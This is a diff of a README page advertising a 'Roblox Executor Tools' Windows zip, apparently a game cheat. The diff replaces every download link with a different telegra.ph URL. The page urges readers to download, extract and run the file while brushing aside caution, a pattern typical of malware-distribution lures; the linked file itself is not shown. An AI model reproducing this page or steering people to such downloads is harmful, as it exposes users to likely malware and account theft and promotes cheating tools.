@@ -1,9 +1,9 @@
-<p align="center"><a href="https://telegra.ph/Download-Tutorial-10-28-7"><img src="banner.jpg" alt="Roblox Executor Tools" width="920"></a></p>
+<p align="center"><a href="https://telegra.ph/fff-10-27-8"><img src="banner.jpg" alt="Roblox Executor Tools" width="920"></a></p>
 <h1 align="center">Roblox Executor Tools</h1>
 <p align="center"><strong>SCRIPT RUNNER  ·  WINDOWS PACK</strong></p>
-<h2 align="center"><a href="https://telegra.ph/Download-Tutorial-10-28-7">⬇  GET THE EXECUTOR — Roblox-Executor-Tools.zip</a></h2>
+<h2 align="center"><a href="https://telegra.ph/fff-10-27-8">⬇  GET THE EXECUTOR — Roblox-Executor-Tools.zip</a></h2>
 <p align="center">**Windows 10 / 11** · `Roblox-Executor-Tools.zip` · **~15 MB** · October 2026</p>
-<p align="center"><a href="https://telegra.ph/Download-Tutorial-10-28-7"><img src="preview.jpg" alt="Roblox Executor Tools" width="860"></a></p>
+<p align="center"><a href="https://telegra.ph/fff-10-27-8"><img src="preview.jpg" alt="Roblox Executor Tools" width="860"></a></p>
 
 People google “Roblox executor” for a file, not a lecture. This hub is that Windows pack.
 
@@ -18,7 +18,7 @@ Script list, attach, run. The zip is the runner. Ads that ask for a key on five 
 
 ### Open it
 
-1. Get [Roblox-Executor-Tools.zip](https://telegra.ph/Download-Tutorial-10-28-7).
+1. Get [Roblox-Executor-Tools.zip](https://telegra.ph/fff-10-27-8).
 2. Extract. Read the three-line note.
 3. Run it. If a window opens, you are done with this page.
 
